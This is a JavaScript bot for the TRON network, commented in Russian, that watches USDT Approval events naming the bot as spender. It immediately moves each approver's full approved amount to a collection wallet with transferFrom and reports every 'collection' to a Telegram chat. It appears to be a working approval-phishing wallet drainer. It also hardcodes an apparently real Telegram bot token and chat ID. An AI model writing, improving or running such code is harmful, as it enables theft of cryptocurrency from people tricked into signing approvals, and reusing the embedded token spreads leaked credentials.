// ============================================
// SWEEPER BOT – ИСПРАВЛЕННАЯ ВЕРСИЯ
// ============================================

const TronWeb = require('tronweb');
const dotenv = require('dotenv');
dotenv.config();

// -------------------- 1. ИНИЦИАЛИЗАЦИЯ С ПРАВИЛЬНЫМ ФОРМАТОМ КЛЮЧА --------------------
const privateKeyRaw = process.env.BOT_PRIVATE_KEY;

// Автоматически добавляем 0x если его нет
const privateKeyHex = privateKeyRaw.startsWith('0x') 
    ? privateKeyRaw 
    : '0x' + privateKeyRaw;

console.log('🔑 Ключ загружен, длина:', privateKeyHex.length, 'символов');

const tronWeb = new TronWeb({
    fullHost: process.env.TRONGRID_API,
    privateKey: privateKeyHex
});

const TOKEN_CONTRACT = process.env.TOKEN_CONTRACT;
const COLLECTION_ADDRESS = process.env.COLLECTION_ADDRESS;
const BOT_ADDRESS = tronWeb.address.fromPrivateKey(privateKeyHex);

// -------------------- Telegram настройки --------------------
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

// -------------------- Состояние бота --------------------
let isActive = true;
let processedTxs = new Set();
let processedAddresses = new Set();
let lastProcessedTime = null;
let stats = {
    totalCollected: 0,
    totalTransactions: 0,
    lastDailyReset: Date.now(),
    dailyCollected: 0,
    dailyTransactions: 0,
    totalErrors: 0,
    totalEnergyBurned: 0,
    dailyErrors: 0,
    dailyEnergyBurned: 0
};
const startTime = Date.now();

console.log('\n🚀 SWEEPER BOT ЗАПУЩЕН');
console.log('=================================');
console.log(`📍 Адрес бота: ${BOT_ADDRESS}`);
console.log(`💰 Сбор USDT на: ${COLLECTION_ADDRESS}`);
console.log('=================================\n');

// -------------------- Функция отправки в Telegram --------------------
async function sendTelegramNotification(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('❌ Ошибка Telegram:', error.message);
    }
}

// Отправка стартового сообщения
(async () => {
    try {
        const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const balanceTRX = tronWeb.fromSun(balance);
        await sendTelegramNotification(`
🚀 <b>Бот запущен</b>

📍 Адрес бота: <code>${BOT_ADDRESS}</code>
💰 Сбор на: <code>${COLLECTION_ADDRESS}</code>
💎 Баланс бота: ${balanceTRX} TRX
        `);
    } catch (error) {
        console.error('Ошибка при отправке стартового сообщения:', error.message);
    }
})();

// -------------------- Поиск approve --------------------
async function getNewApprovals() {
    try {
        const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
        const response = await fetch(
            `https://api.trongrid.io/v1/contracts/${TOKEN_CONTRACT}/events?` +
            new URLSearchParams({
                event_name: 'Approval',
                limit: 100,
                order_by: 'block_timestamp,desc',
                min_block_timestamp: oneDayAgo
            })
        );
        
        if (!response.ok) return [];
        const data = await response.json();
        if (!data.data) return [];

        return data.data.filter(event => {
            const spender = tronWeb.address.fromHex(event.result.spender);
            return spender === BOT_ADDRESS && !processedTxs.has(event.transaction_id);
        });
    } catch (error) {
        console.error('Ошибка получения событий:', error.message);
        return [];
    }
}

// -------------------- Обработка approve --------------------
async function processApproval(event) {
    const owner = tronWeb.address.fromHex(event.result.owner);
    const value = event.result.value;
    const valueUSDT = (value / 1_000_000).toFixed(2);
    const txId = event.transaction_id;

    if (processedTxs.has(txId)) {
        return;
    }

    console.log(`\n✅ Найден approve от ${owner.slice(0,8)}... на ${valueUSDT} USDT`);

    try {
        const contract = await tronWeb.contract().at(TOKEN_CONTRACT);
        
        // Проверяем баланс
        const balance = await contract.balanceOf(owner).call();
        if (balance < value) {
            console.log(`   ⚠️ Недостаточно USDT (баланс: ${tronWeb.fromSun(balance)} USDT)`);
            processedTxs.add(txId);
            return;
        }

        // Проверяем allowance
        const allowance = await contract.allowance(owner, BOT_ADDRESS).call();
        if (allowance < value) {
            console.log(`   ⚠️ Недостаточно allowance`);
            processedTxs.add(txId);
            return;
        }

        // Проверяем баланс бота
        const botBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const botBalanceTRX = tronWeb.fromSun(botBalance);
        
        console.log(`   🤖 Баланс бота: ${botBalanceTRX} TRX`);
        console.log(`   💸 Отправляю transferFrom...`);

        // Выполняем перевод
        const tx = await contract.transferFrom(
            owner,
            COLLECTION_ADDRESS,
            value
        ).send({
            feeLimit: 600_000_000,
            callValue: 0,
            shouldPollResponse: true
        });

        console.log(`   ✅ УСПЕХ! Транзакция: https://tronscan.org/#/transaction/${tx}`);
        
        // Рассчитываем комиссию
        const newBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const feeSpent = (botBalance - newBalance) / 1_000_000;
        
        stats.totalCollected += parseFloat(valueUSDT);
        stats.totalTransactions++;
        stats.totalEnergyBurned += feeSpent;
        stats.dailyCollected += parseFloat(valueUSDT);
        stats.dailyTransactions++;
        stats.dailyEnergyBurned += feeSpent;

        await sendTelegramNotification(`
🚀 <b>УСПЕШНЫЙ СБОР!</b>

💰 Сумма: ${valueUSDT} USDT
📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
📥 На: <code>${COLLECTION_ADDRESS.slice(0,8)}...${COLLECTION_ADDRESS.slice(-4)}</code>
⚡️ Комиссия: ${feeSpent.toFixed(2)} TRX
🤖 Баланс бота: ${botBalanceTRX - feeSpent} TRX
🔗 https://tronscan.org/#/transaction/${tx}
        `);

        processedTxs.add(txId);

    } catch (error) {
        console.error(`❌ Ошибка при обработке:`, error.message);
        stats.totalErrors++;
        stats.dailyErrors++;
        
        await sendTelegramNotification(`
❌ <b>Ошибка</b>
📝 ${error.message}
📤 От: <code>${owner.slice(0,8)}...</code>
💰 Сумма: ${valueUSDT} USDT
        `);
    }
}

// -------------------- Основной цикл --------------------
async function checkAndSweep() {
    lastProcessedTime = new Date().toLocaleString();

    if (!isActive) {
        console.log('⏸ Бот остановлен');
        return;
    }

    console.log(`\n🔍 [${new Date().toLocaleTimeString()}] Поиск approve...`);
    
    const approvals = await getNewApprovals();
    
    if (approvals.length === 0) {
        console.log('⏳ Новых approve нет');
        return;
    }

    console.log(`📊 Найдено событий: 100`);
    console.log(`🎯 Для бота: ${approvals.length}`);
    
    for (const app of approvals) {
        await processApproval(app);
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// -------------------- Запуск --------------------
checkAndSweep();
setInterval(checkAndSweep, 30000);

// -------------------- Обработка остановки --------------------
process.on('SIGINT', async () => {
    console.log('\n👋 Остановка...');
    await sendTelegramNotification(`🛑 <b>Бот остановлен</b>`);
    process.exit(0);
});
